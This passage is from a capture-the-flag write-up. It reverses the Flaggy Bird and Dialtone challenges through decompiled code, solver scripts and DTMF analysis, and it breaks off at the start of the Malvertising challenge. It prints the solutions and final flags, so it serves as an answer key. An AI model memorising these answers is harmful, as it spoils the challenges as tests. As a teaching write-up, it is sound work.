reveal the names of JNI functions. With that, the `nativeCheck` function looks like this:\n\n```c\nbool __fastcall Java_com_google_ctf_game_Checker_nativeCheck(JNIEnv *jni, __int64 a2, jarray input)\n{\n  jarray input_; // r14\n  jbyte *inputCopy; // rax\n  char inputA[16]; // [rsp+0h] [rbp-68h]\n  char inputB[16]; // [rsp+10h] [rbp-58h]\n  char dest[16]; // [rsp+20h] [rbp-48h]\n  unsigned __int64 cookie; // [rsp+30h] [rbp-38h]\n\n  input_ = input;\n  cookie = __readfsqword(0x28u);\n  if ( ((*jni)->GetArrayLength)(jni, input) != 32 )\n    return 0;\n  inputCopy = ((*jni)->GetByteArrayElements)(jni, input_, 0LL);\n  if ( inputA >= inputCopy + 32 || inputCopy >= dest )\n  {\n    *(_OWORD *)inputA = *(_OWORD *)inputCopy;\n    *(_OWORD *)inputB = *((_OWORD *)inputCopy + 1);\n  }\n  else\n  {\n    inputA[0] = *inputCopy;\n    inputA[1] = inputCopy[1];\n    // ... inputA[2...14] = inputCopy[2...14];\n    inputA[15] = inputCopy[15];\n    inputB[0] = inputCopy[16];\n    inputB[1] = inputCopy[17];\n    // ... inputB[2...14] = inputCopy[18...30];\n    inputB[15] = inputCopy[31];\n  }\n  dest[0] = inputA[0] + inputA[1];\n  dest[1] = inputA[2] + inputA[3];\n  // ... dest[2...6] = inputA[4,6...12] + inputA[5,7...13];\n  dest[7] = inputA[14] + inputA[15];\n  dest[8] = inputB[0] + inputB[1];\n  dest[9] = inputB[2] + inputB[3];\n  // ... dest[10...14] = inputA[4,6...12] + inputA[5,7...13];\n  dest[15] = inputB[14] + inputB[15];\n  success = 1;\n  p = 0;\n  M(dest, 16);\n  return dest[15] < 16 && success != 0;\n}\n```\n\nThere are some unnecessary memory operations which take advantage of 128-bit operations, although the subsequent summing probably makes those pointless. To summarise:\n\n - the input array must be 32 bytes long\n - `dest` is a 16-byte-long buffer, where each element is the sum of two consecutive elements from the input array\n - the variables `success` and `p` are set up, then `M` is called on `dest`\n\nThe `M` function:\n\n```c\nvoid __fastcall M(char *data, signed int length)\n{\n  __int64 halfLength; // r13\n  int v3; // er12\n  char *v4; // rbp\n  __int64 v5; // rbx\n  int v6; // er14\n  signed int v7; // eax\n  char v8; // dl\n  __int64 v9; // rbp\n  char desta[16]; // [rsp+10h] [rbp-48h]\n  unsigned __int64 cookie; // [rsp+20h] [rbp-38h]\n\n  cookie = __readfsqword(0x28u);\n  if ( length >= 2 )\n  {\n    halfLength = (unsigned int)length >> 1;\n    M(data, (unsigned int)length >> 1);\n    if ( success )\n    {\n      v3 = length - halfLength;\n      v4 = &data[halfLength];\n      M(&data[halfLength], length - halfLength);\n      if ( success )\n      {\n        if ( v3 > 0 )\n        {\n          v5 = 0LL;\n          v6 = 0;\n          v7 = 0;\n          while ( 1 )\n          {\n            v8 = v4[v6];\n            if ( data[v7] >= v8 )\n            {\n              if ( data[v7] <= v8 || d[p] )\n              {\nFAILURE:\n                success = 0;\n                return;\n              }\n              ++p;\n              desta[v5] = v4[v6++];\n            }\n            else\n            {\n              if ( d[p] != 1 )\n                goto FAILURE;\n              ++p;\n              desta[v5] = data[v7++];\n            }\n            ++v5;\n            if ( v7 >= (signed int)halfLength || v6 >= v3 )\n              goto LABEL_17;\n          }\n        }\n        v7 = 0;\n        v6 = 0;\n        LODWORD(v5) = 0;\nLABEL_17:\n        if ( v7 < (signed int)halfLength )\n        {\n          v9 = (unsigned int)(halfLength - 1 - v7);\n          memcpy(&desta[(signed int)v5], &data[v7], v9 + 1);\n          LODWORD(v5) = v5 + v9 + 1;\n        }\n        if ( v6 < v3 )\n          memcpy(&desta[(signed int)v5], &data[halfLength + v6], (unsigned int)(length - 1 - v6 - halfLength) + 1LL);\n        memcpy(data, desta, length);\n      }\n    }\n  }\n}\n```\n\nTakes a pointer and a length, does an operation on the first half recursively, then the second half recursively, then it is merged – this is clearly a [merge sort](https://en.wikipedia.org/wiki/Merge_sort), but there is a twist! Every time there is a comparison of two elements, its result must be equal to the next entry in the `d` array:\n\n```\nd = [\n  0, 0, 0, 0, 1, 0, 0, 1,\n  0, 1, 1, 1, 1, 0, 0, 0,\n  1, 1, 0, 0, 1, 0, 1, 0,\n  0, 0, 1, 1, 1, 0, 0, 0,\n  1, 0, 0, 0, 0, 1, 1, 1,\n  1, 1, 0, 1, 0\n];\n```\n\nFurthermore, the result of a comparison can never be equality, so all elements must be unique.\n\nSetting the `p` variable to `0` back in `nativeCheck` now makes sense – every time the function is called, the position in the comparison results array is reset. We also know how the `success` variable is modified, and we also have that `dest[15] < 16` *after* the merge sort.\n\nHere we can make a guess (which will be confirmed later when reversing `f`): `dest` should contain all numbers from `0` to `15` exactly once. If this is the case, we can figure out what `dest` must be before it is sorted based on the `d` array. The method is to simply perform the merge sort just like the program. If a comparison fails, swap the two problematic elements around, then restart the sort. Repeat until the array is sorted completely without failing any of the comparison checks.\n\n[Full merge sort reversing script](scripts/FlaggyBirdSort.hx)\n\n```bash\n$ haxe --run FlaggyBirdSort\nFlaggyBirdSort.hx:12: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]\nFlaggyBirdSort.hx:12: [1,0,2,3,4,5,6,7,8,9,10,11,12,13,14,15]\n# ... etc\nFlaggyBirdSort.hx:12: [9,8,7,2,11,14,13,10,6,5,15,4,3,0,12,1]\nFlaggyBirdSort.hx:12: [9,8,7,2,11,15,13,10,6,5,14,4,3,0,12,1]\n```\n\nSo if `dest` is `[9,8,7,2,11,15,13,10,6,5,14,4,3,0,12,1]`, `nativeCheck` will return true. Keep in mind that each element in the `dest` array is a sum of two elements from the `input` array, so without further knowledge about the `input` array, there are still too many possible inputs.\n\n### `f`\n\n[`f`](files/flaggybird-decompiled/f.java) is a bit longer, but the majority of the length is due to long arrays, enums, and switches. Let's examine the sections one at a time:\n\n```java\nstatic final a[] a = new a[]{a.EGG_0, a.EGG_1, /*...*/, a.EGG_15};\nstatic final a[] b = new a[]{a.FLAG_0, a.FLAG_1, /*...*/, a.FLAG_15};\na[][] c;\nint[][] d;\nint e;\nint f;\nh g;\nprivate int h = 190;\nprivate int i = 46;\nprivate d[][] j;\nprivate int[][] k;\nprivate a[] l;\nprivate List<Integer> m;\nprivate int n;\nprivate int o;\n```\n\n`a` and `b` seem to be subsets of possible `enum a`((the single-letter name mangling is a bit annoying!) values in order. `h` and `i` could match the width and height of maps in the game. The remaining variables are harder or impossible to identify, so we'll move on for now.\n\n```java\nenum a {\n    AIR,\n    GROUND,\n    DIAGONAL_A,\n    // ...\n    COMPUTER,\n    EGG_HOLDER,\n    EGG_0,\n    // ...\n    EGG_15,\n    BACKGROUND,\n    PORTAL,\n    FLAG_0,\n    // ...\n    FLAG_15\n}\n```\n\n`enum a` is an enumeration of all the possible map tiles.\n\n```java\nprivate void a(int i) {\n  a(g.e.a(String.format(\"level%d.bin\", new Object[]{Integer.valueOf(i)})).i());\n}\n```\n\nThis function takes a number as input, i.e. the level number, then passes the string `level<num>.bin` to `g.e.a(...).i()`. The latter is probably an asset loader which will return a byte array. This is then passed to another overload of `a`:\n\n```java\nprivate void a(byte[] bArr) {\n  InflaterInputStream inflaterInputStream = new InflaterInputStream(new ByteArrayInputStream(bArr));\n  byte[] bArr2 = new byte[(this.h * this.i)];\n  if (inflaterInputStream.read(bArr2) == this.h * this.i) {\n    // ...\n  }\n  throw new IOException();\n}\n```\n\nHere we take the input stream and [inflate](https://en.wikipedia.org/wiki/DEFLATE) it. We can also confirm that `h` and `i` represent the map dimensions (commonly multiplied together to make a big array for storing the whole map).\n\nSince we have access to the level files, we can inflate them ourselves to see what data the program is working with at this point.\n\n```python\n>>> import zlib\n>>> zlib.decompress(open(\"level1.bin\", \"rb\").read())\nb'111111111111111111111111111111111111111111 ... 000000000000'\n```\n\nHere are the decompressed levels, with linebreaks inserted to show the 2D layout of the map clearly:\n\n - [`level1.txt`](files/flaggybird-level1.txt)\n - [`level2.txt`](files/flaggybird-level2.txt)\n - [`level3.txt`](files/flaggybird-level3.txt)\n\nThe overall structure of each level is more or less visible (`0` is air), but the details are hard to understand, since we don't know what symbol represents which tile. Let's continue with the `a` function:\n\n```java\nint i;\nint i2;\nthis.c = new a[this.i][];\nthis.d = new int[this.i][];\nthis.k = new int[32][];\n// set up 2D arrays\nfor (i = 0; i < this.i; i++) { // for each row\n  this.c[i] = new a[this.h];\n  this.d[i] = new int[this.h];\n  for (i2 = 0; i2 < this.h; i2++) { // for each column\n    this.d[i][i2] = -1;\n  }\n}\nthis.n = 0;\nfor (i = 0; i < this.i; i++) { // for each row\n  for (i2 = 0; i2 < this.h; i2++) { // for each column\n    // get a tile type (enum a) from the character somehow\n    a a = a(bArr2[(this.h * i) + i2]);\n    // put it into the map\n    this.c[(this.i - i) - 1][i2] = a;\n    if (a == a.EGG_HOLDER) {\n      // for each egg holder, store its index in the map\n      this.d[(this.i - i) - 1][i2] = this.n;\n      // and its position in the array of egg holders\n      this.k[this.n] = new int[]{i2, (this.i - i) - 1};\n      this.n++;\n    }\n  }\n}\n// finally, set all egg holders to hold value 0 initially\nthis.l = new a[this.n];\nfor (int i3 = 0; i3 < this.l.length; i3++) {\n  this.l[i3] = a.EGG_0;\n}\nthis.m = new ArrayList();\nreturn;\n```\n\nWe can see now that the function goes through the decompressed output character by character and creates tiles. We also guessed at what the \"eggs\" represent – they are the interactible inputs in the final level, each of which can hold an \"egg\", a value from 0 to 15. The interactibility we can figure out from the physics class ([`g`](files/flaggybird-decompiled/g.java)). Some of the hints also come from the other functions that follow.\n\nAs the function adds tiles to the `c` array, it converts them from bytes using this function:\n\n```java\nprivate a a(byte b) {\n  if (b == (byte) 65) {\n    return a.DIAGONAL_AA;\n  }\n  if (b == (byte) 120) {\n    return a.BACKGROUND;\n  }\n  switch (b) {\n    case (byte) 49:\n      return a.GROUND;\n    case (byte) 50:\n      return a.EGG_HOLDER;\n    /* etc etc */\n  }\n}\n```\n\nThe decompiler output is not very pretty here, creating unnecessarily nested switches. However, we can easily see the mapping of bytes to tile types, which we will use shortly. There is another `a` overload, which accepts tile types and returns elements from a 2D array, `j`:\n\n```java\npublic d a(a aVar) {\n  switch (aVar) {\n    case AIR:\n      return null;\n    case COMPUTER:\n      return this.j[5][1];\n    case EGG_HOLDER:\n      return this.j[4][1];\n    // etc\n  }\n}\n```\n\nSince the tile types kept their names, we can figure out that the indices in the function correspond to XY coordinates (in tiles) in the [`tileset.png`](files/flaggybird-tileset.png) asset:\n\n![](screens/tileset-annotated.png)\n\nNow we can also show all the levels:\n\n![](screens/level1.png)\n\n![](screens/level2.png)\n\n![](screens/level3.png)\n\nThe final function of interest in the `f` class is this one:\n\n```java\npublic void a(int i, int i2) {\n  // set l[i] to EGG_<i2>\n  this.l[i] = a[i2];\n  \n  // check if m contains i\n  int i3 = -1;\n  for (int i4 = 0; i4 < this.m.size(); i4++) {\n    if (((Integer) this.m.get(i4)).intValue() == i) {\n      if (i2 == 0) {\n        // if it does and i2 == 0, remember the index in the m list\n        i3 = i4;\n      } else {\n        // if it does and i2 != 0, done\n        return;\n      }\n    }\n  }\n\n  // if i was found in m and i2 == 0, remove it from m\n  if (i3 != -1) {\n    this.m.remove(i3);\n  }\n  \n  // if i2 != 0, add i to m\n  if (i2 != 0) {\n    this.m.add(Integer.valueOf(i));\n    // if m has 16 or more elements now, remove the first one and set it to 0\n    if (this.m.size() > 15) {\n      this.l[((Integer) this.m.remove(0)).intValue()] = a.EGG_0;\n    }\n  }\n}\n```\n\nThe above version might be a bit confusing even with the comments. We can summarise the function as follows:\n\n - `setEgg(int eggIndex, int eggValue)`\n   - set `eggs[eggIndex]` to `eggValue`\n   - if `eggValue` (the new value for the egg) is non-zero:\n     - if the egg was already set before, we've just changed its value to another one, we're done\n     - if the egg was not set before AND there are now 16 or more eggs set to non-zero values, set the one that was touched least recently to zero and forget about it\n   - if `eggValue` is zero:\n     - if the egg was already set before, forget about it\n\nIn other words, only 15 of the 32 egg holders in level 3 can contain a non-zero egg value.\n\n### Decoding the flag\n\nNow we can put all the pieces together to get the correct solution for the eggs:\n\n - `input` is an array of 32 elements (or eggs)\n - each element can be a number from `0` to `15` inclusive (there are only 16 egg types)\n - only 15 elements can be non-zero\n - the sums of consecutive pairs of `input` must be `[9,8,7,2,11,15,13,10,6,5,14,4,3,0,12,1]`\n - we know the SHA-256 hash of the correct `input`\n\nThere are 15 non-zero `input` elements and 15 non-zero pair sums - so we know that in each pair of `input` elements, only one can be non-zero.\n\n```\n9 = input[0]  + input[1]  = 9 + 0 OR 0 + 9\n8 = input[2]  + input[3]  = 8 + 0 OR 0 + 8\n7 = input[4]  + input[3]  = 7 + 0 OR 0 + 7\n2 = input[6]  + input[3]  = 2 + 0 OR 0 + 2\n...\n1 = input[30] + input[31] = 1 + 0 OR 0 + 1\n```\n\nSince the zero pair is fixed, we have 15 binary choices, giving us a total of `2 ** 15 == 32768` possibilities, a very small number for brute-forcing.\n\n[Full key-finding script here](scripts/flaggyBirdKey.py)\n\n```bash\n$ python3 flaggyBirdKey.py \n[9, 0, 0, 8, 0, 7, 2, 0, 0, 11, 0, 15, 13, 0, 10, 0, 6, 0, 0, 5, 14, 0, 0, 4, 0, 3, 0, 0, 12, 0, 1, 0]\n```\n\nNext, we use the recovered key to decrypt the `c` array from [`Checker`](#checker).\n\n```bash\n$ python3 flaggyBirdFlag.py\n```\n\nThe [output](files/flaggybird-flag.txt) is another level. Clearly there are letters spelling out the flag using the `FLAG_*` tiles from the tileset, but they are a bit hard to read. Luckily, we already figured out the level format, so we can see the flag as it would appear in the game:\n\n![](screens/level4.png)\n\n`CTF{Up_d0WN_TAp_TAp_TAp_tHe_b1rd_g0Es_flaG_flaG_flaG}`\n\n## 189 Reversing / Dialtone ##\n\n**Description**\n\n> You might need a pitch-perfect voice to solve this one. Once you crack the code, the flag is CTF{code}.\n\n**Files provided**\n\n - [dialtone](files/dialtone)\n\n**Solution**\n\nLooking at the file in IDA, we can immediately see references to some `pa_...` functions. We can confirm our suspicions with `ldd`:\n\n```bash\n$ ldd a.out \n\tlinux-vdso.so.1 =>  (0x00007ffd1f1b6000)\n\tlibpulse.so.0 => /usr/lib/x86_64-linux-gnu/libpulse.so.0 (0x00007f34b722c000)\n\tlibpulse-simple.so.0 => /usr/lib/x86_64-linux-gnu/libpulse-simple.so.0 (0x00007f34b7028000)\n\tlibm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f34b6d22000)\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f34b6959000)\n\tlibjson-c.so.2 => /lib/x86_64-linux-gnu/libjson-c.so.2 (0x00007f34b674e000)\n\tlibpulsecommon-4.0.so => /usr/lib/x86_64-linux-gnu/pulseaudio/libpulsecommon-4.0.so (0x00007f34b64e7000)\n\tlibdbus-1.so.3 => /lib/x86_64-linux-gnu/libdbus-1.so.3 (0x00007f34b62a2000)\n\tlibpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f34b6084000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007f34b7678000)\n\tlibxcb.so.1 => /usr/lib/x86_64-linux-gnu/libxcb.so.1 (0x00007f34b5e65000)\n\tlibwrap.so.0 => /lib/x86_64-linux-gnu/libwrap.so.0 (0x00007f34b5c5b000)\n\tlibsndfile.so.1 => /usr/lib/x86_64-linux-gnu/libsndfile.so.1 (0x00007f34b59f2000)\n\tlibasyncns.so.0 => /usr/lib/x86_64-linux-gnu/libasyncns.so.0 (0x00007f34b57ec000)\n\tlibrt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 (0x00007f34b55e4000)\n\tlibXau.so.6 => /usr/lib/x86_64-linux-gnu/libXau.so.6 (0x00007f34b53e0000)\n\tlibXdmcp.so.6 => /usr/lib/x86_64-linux-gnu/libXdmcp.so.6 (0x00007f34b51da000)\n\tlibnsl.so.1 => /lib/x86_64-linux-gnu/libnsl.so.1 (0x00007f34b4fc0000)\n\tlibFLAC.so.8 => /usr/lib/x86_64-linux-gnu/libFLAC.so.8 (0x00007f34b4d8f000)\n\tlibvorbisenc.so.2 => /usr/lib/x86_64-linux-gnu/libvorbisenc.so.2 (0x00007f34b4ae6000)\n\tlibresolv.so.2 => /lib/x86_64-linux-gnu/libresolv.so.2 (0x00007f34b48cb000)\n\tlibogg.so.0 => /usr/lib/x86_64-linux-gnu/libogg.so.0 (0x00007f34b46c2000)\n\tlibvorbis.so.0 => /usr/lib/x86_64-linux-gnu/libvorbis.so.0 (0x00007f34b4497000)\n```\n\nThere is a number of audio codec libraries linked but, most importantly, the [Pulse Audio library](https://www.freedesktop.org/wiki/Software/PulseAudio/), which can deal with audio input and output on Linux. Let's have a look at the decompiled `main` function:\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  __int64 v3; // rax\n  int result; // eax\n  __int64 v5; // rax\n  char v6; // [rsp+18h] [rbp-28020h]\n  char v7; // [rsp+8018h] [rbp-20020h]\n  int v8; // [rsp+2801Ch] [rbp-1Ch]\n  int v9; // [rsp+28020h] [rbp-18h]\n  char v10; // [rsp+28024h] [rbp-14h]\n  unsigned int v11; // [rsp+28028h] [rbp-10h]\n  int v12; // [rsp+2802Ch] [rbp-Ch]\n  __int64 v13; // [rsp+28030h] [rbp-8h]\n\n  v13 = pa_simple_new(0LL, *argv, 2LL, 0LL, \"record\", &ss_3811, 0LL, 0LL, &v11);\n  if ( v13 )\n  {\n    v8 = 0;\n    v9 = 0;\n    v10 = 0;\n    do\n    {\n      if ( (signed int)pa_simple_read(v13, &v6, 0x8000LL, &v11) < 0 )\n      {\n        v5 = pa_strerror(v11);\n        fprintf(stderr, \"pa_simple_read() failed: %s\\n\", v5);\n        return 1;\n      }\n      x(&v6, &v7);\n      v12 = r(&v8, &v7);\n      if ( v12 < 0 )\n      {\n        fwrite(\"FAILED\\n\", 1uLL, 7uLL, stderr);\n        return 1;\n      }\n    }\n    while ( v12 );\n    fwrite(\"SUCCESS\\n\", 1uLL, 8uLL, stderr);\n    pa_simple_free(v13, 1LL);\n    result = 0;\n  }\n  else\n  {\n    v3 = pa_strerror(v11);\n    fprintf(stderr, \"pa_simple_new() failed: %s\\n\", v3);\n    result = 1;\n  }\n  return result;\n}\n```\n\nThe program connects to a pulse audio server using the [simple API](https://freedesktop.org/software/pulseaudio/doxygen/simple.html). The sample spec `ss_3811` specifies 1 channel at 44100 Hz, and the stream description is \"record\" - the program will try to access the microphone.\n\nThen we have a loop, reading samples into an audio buffer (`v6`), `0x8000` bytes at a time. The `x` function is called on that audio buffer, somehow transfers data into another buffer (`v7`), then the success / failure is determined based on the second buffer in the function `r`.\n\nLet's have a look into `x`:\n\n```c\nvoid __fastcall x(__int64 a1, __int64 a2)\n{\n  signed int v2; // [rsp+14h] [rbp-Ch]\n  signed int j; // [rsp+18h] [rbp-8h]\n  signed int i; // [rsp+1Ch] [rbp-4h]\n\n  bit_flip(a1, a2);\n  for ( i = 1; i <= 13; ++i )\n  {\n    v2 = 1 << i;\n    for ( j = 0; j <= 0x1FFF; j += v2 )\n      y(a2, (unsigned int)j, v2);\n  }\n}\n```\n\nAnd the accompanying `y` function:\n\n```c\nvoid __fastcall y(__int64 a1, __int64 a2, signed int a3)\n{\n  double v3; // ST48_8\n  double *v4; // rax\n  double v5; // ST30_8\n  double v6; // ST38_8\n  signed __int64 v7; // rdx\n  __int128 v8; // xmm2\n  __int128 v9; // xmm3\n  double *v10; // rbx\n  double *v11; // rbx\n  signed int v12; // [rsp+10h] [rbp-60h]\n  int i; // [rsp+5Ch] [rbp-14h]\n\n  v12 = a3;\n  for ( i = 0; i < v12 / 2; ++i )\n  {\n    cexp(a1, a2);\n    v3 = -0.0 * (long double)i / (long double)v12;\n    v4 = (double *)(16LL * ((signed int)a2 + i) + a1);\n    v5 = *v4;\n    v6 = v4[1];\n    v7 = 16LL * (i + (signed int)a2 + v12 / 2);\n    v8 = *(unsigned __int64 *)(v7 + a1);\n    v9 = *(unsigned __int64 *)(v7 + a1 + 8);\n    complex_mul(v3);\n    v10 = (double *)(16LL * ((signed int)a2 + i) + a1);\n    *(_QWORD *)v10 = complex_add(v5, v6, v3);\n    v10[1] = v6;\n    v11 = (double *)(16LL * (i + (signed int)a2 + v12 / 2) + a1);\n    complex_sub(a1);\n    *v11 = v5;\n    v11[1] = v6;\n  }\n}\n```\n\nThe buffer contains audio data, `x` goes through powers of 2 (`2 ** 13 == 8192`), then has a loop over samples with an inner loop in the `y` function performing complex number operations. All of these are very strong hints that we are looking at a [Fourier transform](https://en.wikipedia.org/wiki/Discrete_Fourier_transform) function.\n\nMore specifically `x` and `y` form an implementation of the [iterative Cooley-Tukey Fast Fourier Transform with bit reversal](https://en.wikipedia.org/wiki/Cooley%E2%80%93Tukey_FFT_algorithm#Data_reordering,_bit_reversal,_and_in-place_algorithms).\n\nIn simple terms, the `x` function detects the volume of individual frequencies in the audio buffer. The description of the challenge further supports this theory. With this assumption, we can clean up `main`:\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  __int64 strError_; // rax\n  int result; // eax\n  __int64 strError; // rax\n  double audioBuffer[4096]; // [rsp+18h] [rbp-28020h]\n  complex fftBuffer[8192]; // [rsp+8018h] [rbp-20020h]\n  state_s state; // [rsp+2801Ch] [rbp-1Ch]\n  unsigned int paError; // [rsp+28028h] [rbp-10h]\n  int subResult; // [rsp+2802Ch] [rbp-Ch]\n  void *paServer; // [rsp+28030h] [rbp-8h]\n\n  paServer = (void *)pa_simple_new(0LL, *argv, 2LL, 0LL, \"record\", &paSpec, 0LL, 0LL, &paError);\n  if ( paServer )\n  {\n    state.field_0 = 0;\n    state.field_4 = 0;\n    state.field_8 = 0;\n    do\n    {\n      if ( (signed int)pa_simple_read(paServer, audioBuffer, 0x8000LL, &paError) < 0 )\n      {\n        strError = pa_strerror(paError);\n        fprintf(stderr, \"pa_simple_read() failed: %s\\n\", strError);\n        return 1;\n      }\n      fourier(audioBuffer, fftBuffer);\n      subResult = r(&state, fftBuffer);\n      if ( subResult < 0 )\n      {\n        fwrite(\"FAILED\\n\", 1uLL, 7uLL, stderr);\n        return 1;\n      }\n    }\n    while ( subResult );\n    fwrite(\"SUCCESS\\n\", 1uLL, 8uLL, stderr);\n    pa_simple_free(paServer, 1LL);\n    result = 0;\n  }\n  else\n  {\n    strError_ = pa_strerror(paError);\n    fprintf(stderr, \"pa_simple_new() failed: %s\\n\", strError_);\n    result = 1;\n  }\n  return result;\n}\n```\n\nNow we can move on to the `r` function. There are several calls to a function called `f`, taking the result of the FFT and an integer:\n\n```c\nv8 = f(fftBuffer, 1209);\nv9 = f(fftBuffer, 1336);\nv10 = f(fftBuffer, 1477);\nv11 = f(fftBuffer, 1633);\n```\n\n`f`:\n\n```\ndouble __fastcall f(complex *a1, int frequency)\n{\n  return cabs(a1[(frequency << 13) / 44100]);\n}\n```\n\n`frequency` is given in Hertz, but then it is multiplied by `8192 / 44100`.\n\n - `44100` is the sampling rate - number of samples (doubles) per second recorded\n - `8192` is the size of the FFT buffer\n\nFrom DFT we know that this index will represent the amplitude, i.e. [volume of the sinewave](https://en.wikipedia.org/wiki/Discrete_Fourier_transform#Motivation) (pure tone) at the given `frequency`. Let's name it `measureFrequency`.\n\nSo the `r` function measures a the loudness of various frequencies, specifically:\n\n - 1209, 1336, 1477, 1633\n - 697, 770, 852, 941\n\nThere are two groups, as shown above, and the maximum is picked for each. The index of the loudest frequency in the group is kept. Finally, these indices are combined into a single number `0` ... `15`.\n\n```c\namplitudes1[0] = measureFrequency(fftBuffer, 1209);\namplitudes1[1] = measureFrequency(fftBuffer, 1336);\namplitudes1[2] = measureFrequency(fftBuffer, 1477);\namplitudes1[3] = measureFrequency(fftBuffer, 1633);\nmaxIndex1 = -1;\nmaxAmplitude1 = 1.0;\nfor ( i = 0; i <= 3; ++i )\n{\n  if ( amplitudes1[i] > maxAmplitude1 )\n  {\n    maxIndex1 = i;\n    maxAmplitude1 = amplitudes1[i];\n  }\n}\namplitudes2[0] = measureFrequency(fftBuffer, 697);\namplitudes2[1] = measureFrequency(fftBuffer, 770);\namplitudes2[2] = measureFrequency(fftBuffer, 852);\namplitudes2[3] = measureFrequency(fftBuffer, 941);\nmaxIndex2 = -1;\nmaxAmplitude2 = 1.0;\nfor ( j = 0; j <= 3; ++j )\n{\n  if ( amplitudes2[j] > maxAmplitude2 )\n  {\n    maxIndex2 = j;\n    maxAmplitude2 = amplitudes2[j];\n  }\n}\n// ...\ntone = maxIndex1 | 4 * maxIndex2;\n```\n\nThere is a sequence position counter, which determines which \"tone\" is expected next:\n\n```c\ntone = maxIndex1 | 4 * maxIndex2;\nsuccess = 0;\nswitch ( state->field_4 )\n{\n  case 0u:\n    success = tone == 9;\n    goto EVALUATE;\n  case 1u:\n    success = tone == 5;\n    goto EVALUATE;\n  case 2u:\n    success = tone == 10;\n    goto EVALUATE;\n  case 3u:\n    success = tone == 6;\n    goto EVALUATE;\n  case 4u:\n    success = tone == 9;\n    goto EVALUATE;\n  case 5u:\n    success = tone == 8;\n    goto EVALUATE;\n  case 6u:\n    success = tone == 1;\n    goto EVALUATE;\n  case 7u:\n    success = tone == 13;\n    goto EVALUATE;\n  case 8u:\n    if ( tone )\n      goto EVALUATE;\n    return 0;\n  default:\nEVALUATE:\n    if ( success != 1 )\n      return -1u;\n    ++state->field_4;\n    state->field_0 = 0;\n    state->field_8 = 1;\n    break;\n}\n```\n\nSo the tone sequence is:\n\n    9, 5, 10, 6, 9, 8, 1, 13, 0\n\nThe final piece of the puzzle is to note the connection to phones since the challenge is called \"dialtone\". Searching for dialtone systems and the specific frequencies we have in the challenge leads us to [Dual-tone multi-frequency signaling](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling). This system encodes numbers and symbols as combinations of two frequencies:\n\n| -          | **1209 Hz** | **1336 Hz** | **1477 Hz** | **1633 Hz** |\n| ---------- | ----------- | ----------- | ----------- | ----------- |\n| **697 Hz** | 1           | 2           | 3           | A           |\n| **770 Hz** | 4           | 5           | 6           | B           |\n| **852 Hz** | 7           | 8           | 9           | C           |\n| **941 Hz** | *           | 0           | #           | D           |\n\nWe can map all frequencies to their respective indices, then find the mapping of `tone` values to characters on a phone keypad:\n\n| `maxIndex1` | Frequency 1 | `maxIndex2` | Frequency 2 | `tone` | Character |\n| ----------- | ----------- | ----------- | ----------- | ------ | --------- |\n| `0`         | 1209 Hz     | `0`         | 697 Hz      | `0`    | 1         |\n| `1`         | 1336 Hz     | `0`         | 697 Hz      | `1`    | 2         |\n| `2`         | 1477 Hz     | `0`         | 697 Hz      | `2`    | 3         |\n| `3`         | 1633 Hz     | `0`         | 697 Hz      | `3`    | A         |\n| `0`         | 1209 Hz     | `1`         | 770 Hz      | `4`    | 4         |\n| `1`         | 1336 Hz     | `1`         | 770 Hz      | `5`    | 5         |\n| `2`         | 1477 Hz     | `1`         | 770 Hz      | `6`    | 6         |\n| `3`         | 1633 Hz     | `1`         | 770 Hz      | `7`    | B         |\n| `0`         | 1209 Hz     | `2`         | 852 Hz      | `8`    | 7         |\n| `1`         | 1336 Hz     | `2`         | 852 Hz      | `9`    | 8         |\n| `2`         | 1477 Hz     | `2`         | 852 Hz      | `10`   | 9         |\n| `3`         | 1633 Hz     | `2`         | 852 Hz      | `11`   | C         |\n| `0`         | 1209 Hz     | `3`         | 941 Hz      | `12`   | *         |\n| `1`         | 1336 Hz     | `3`         | 941 Hz      | `13`   | 0         |\n| `2`         | 1477 Hz     | `3`         | 941 Hz      | `14`   | #         |\n| `3`         | 1633 Hz     | `3`         | 941 Hz      | `15`   | D         |\n\nNow we can map the sequence to the proper characters and put the result in `CTF{...}` (as per the challenge description) to get the flag:\n\n`CTF{859687201}`\n\n### Bonus\n\nJust for fun, we can generate the audio signal that would produce the flag using real DTMF frequencies.\n\n```bash\n# depends on `sox` in PATH\nsox -n -r 44100 -d --combine sequence \\\n    synth 0.1 sine 1336 sine 852 : \\\n    synth 0.1 sine 1336 sine 770 : \\\n    synth 0.1 sine 1477 sine 852 : \\\n    synth 0.1 sine 1477 sine 770 : \\\n    synth 0.1 sine 1336 sine 852 : \\\n    synth 0.1 sine 1209 sine 852 : \\\n    synth 0.1 sine 1336 sine 697 : \\\n    synth 0.1 sine 1336 sine 941 : \\\n    synth 0.1 sine 1209 sine 697\n```\n\n[Here is the generated wave file](files/dialtone.wav)\n\n## 140 Reversing / Malvertising ##\n\n**Description**\n\n> Unravel the layers of malvertising to uncover the Flag\n> \n> https://malvertising.web.ctfcompetition.com/\n\n**No files provided**\n\n**Solution**\n\nUpon visiting the website, we are greeted with a fake YouTube page with an ad. All of it is just a static background image, except for the ad, which seems legit enough for uBlock to block it. Before diving into the ad itself, we note that the logo says \"YouTube <sup>CA</sup>\". Canada?\n\n### Stage 1\n\nThe ad frame links to [`ads/ad.html`](files/malvertising1.html).\n\nThis file has some standard ad stuff, but more importantly links to a [JavaScript file](files/malvertising2.js):\n\n```html\n<script id=\"adjs\" src=\"./src/metrics.js\" type=\"text/javascript\"></script>\n```\n\nRunning the code through a [JavaScript beautifier](https://beautifier.io/) (result [here](files/malvertising2-b.js)), we can see a couple of top-level sections. The first starts with an immediately invoked anonymous function:\n\n```js\n! function(a, b, c) {\n  \"undefined\" != typeof module && module.exports ? module.exports = c() :\n    \"function\" == typeof define && define.amd ? define(c) : b[a] = c()\n}(\"steg\", this, function() {\n  // ...\n});\n```\n\nThis seems like a universal module loader, compatible with CommonJS (`module.exports`), AMD (`define`), as well as browsers (`b[a] = c()` results in `this[\"steg\"] = c()`, where `this` is just `window` here). The `steg` module defines some basic maths functions for dealing with primes, as well as an `encode` and `decode` function that accepts an image.\n\nNext, there is a number of Base-64 